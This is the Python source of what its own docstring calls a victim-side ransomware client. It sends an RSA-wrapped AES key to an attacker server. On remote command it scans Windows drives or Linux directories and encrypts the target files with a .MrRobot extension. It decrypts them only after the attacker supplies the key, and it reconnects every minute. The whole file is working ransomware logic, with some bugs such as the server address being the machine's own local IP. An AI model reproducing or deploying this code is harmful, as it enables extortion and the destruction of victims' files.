
import time
import socket
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Util import Counter
import os
from main import encrypt_the_files
from main import decrypt_the_files
from Cryptodome.Random import get_random_bytes
from main import target_extension, windows_partition, linux_partition
import platform

padding = lambda key: key + (16 - len(key) % 16) * b"*"

def get_local_ip():
    """Returns the local IP address of your machine in the network."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"


def client():
    """
    Victim-side ransomware client.
    Waits for attacker commands to encrypt/decrypt files.
    """
    
    # Check if public key exists
    if not os.path.exists("public.pem"):
        return
    
    # Load attacker's PUBLIC key
    with open("public.pem", "r") as f:
        public_key_data = f.read()
    
    public_key = RSA.import_key(public_key_data)
    
    # ===== STEP 1: Generate Random AES Key (Victim Side) =====
    aes_key = get_random_bytes(32)  # 256-bit random key
    
    # ===== STEP 2: Encrypt AES Key with Attacker's Public Key =====
    cipher = PKCS1_OAEP.new(public_key)
    encrypted_aes_key = cipher.encrypt(aes_key)
    
    # ===== STEP 3: Pad the AES Key for Cipher =====
    padded_key = padding(aes_key)
    
    # ===== STEP 4: Connect to Attacker's Server =====
    port = 1234
    ip = get_local_ip()
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        
        # Send encrypted AES key to attacker
        s.send(encrypted_aes_key)
        
        # Wait for confirmation
        response = s.recv(2048).decode('ascii')
        
        # Store list of encrypted files
        all_files = []
        
        # ===== STEP 5: Command Loop - Wait for Attacker Commands =====
        while True:
            command = s.recv(2048).decode("ascii")
            
            if command.lower() in ["en", "encryption"]:
                # ===== ENCRYPT ALL FILES =====
                try:
                    # Scan for target files
                    all_files = []
                    
                    if platform.system() == "Windows":
                        drives = windows_partition()
                        for drive in drives:
                            files = target_extension(drive)
                            all_files.extend(files)
                    else:
                        dirs = linux_partition()
                        for directory in dirs:
                            try:
                                files = target_extension(directory)
                                all_files.extend(files)
                            except:
                                continue
                    
                    # Encrypt each file
                    encrypted_count = 0
                    for file_path in all_files:
                        try:
                            result = encrypt_the_files(padded_key, file_path)
                            if result:
                                encrypted_count += 1
                        except Exception as e:
                            continue
                    
                    s.send(f"✓ Successfully encrypted {encrypted_count} files".encode('ascii'))
                    
                    # Delete plaintext key after encryption
                    del aes_key
                    
                except Exception as e:
                    s.send(f"✗ Encryption error: {str(e)}".encode('ascii'))
            
            elif command.lower() in ["de", "decryption"]:
                # ===== DECRYPT ALL FILES =====
                try:
                    # Send ready message
                    s.send("Ready to receive decryption key".encode('ascii'))
                    
                    # Receive the decryption key from attacker
                    decryption_key = s.recv(2048)
                    
                    if len(decryption_key) == 32:
                        padded_decrypt_key = padding(decryption_key)
                        
                        # Decrypt all files
                        decrypted_count = 0
                        for file_path in all_files:
                            try:
                                # The file now has .MrRobot extension
                                encrypted_file = file_path + ".MrRobot"
                                if os.path.exists(encrypted_file):
                                    decrypt_the_files(padded_decrypt_key, encrypted_file)
                                    decrypted_count += 1
                            except:
                                continue
                        
                        s.send(f"✓ Successfully decrypted {decrypted_count} files".encode('ascii'))
                    else:
                        s.send("✗ Invalid decryption key received".encode('ascii'))
                        
                except Exception as e:
                    s.send(f"✗ Decryption error: {str(e)}".encode('ascii'))
            
            elif command.lower() == "status":
                # ===== STATUS CHECK =====
                s.send(f"Connected. {len(all_files)} files in memory.".encode('ascii'))
            
            elif command.lower() == "exit":
                # ===== EXIT =====
                s.send("Exiting client...".encode('ascii'))
                time.sleep(1)
                break
            
            else:
                # ===== UNKNOWN COMMAND =====
                s.send("Unknown command. Available: en, de, scan, status, exit".encode('ascii'))
        
    except Exception as e:
        time.sleep(60)
        client()  # Retry connection
    
    finally:
        if s:
            s.close()


if __name__ == "__main__":
    client()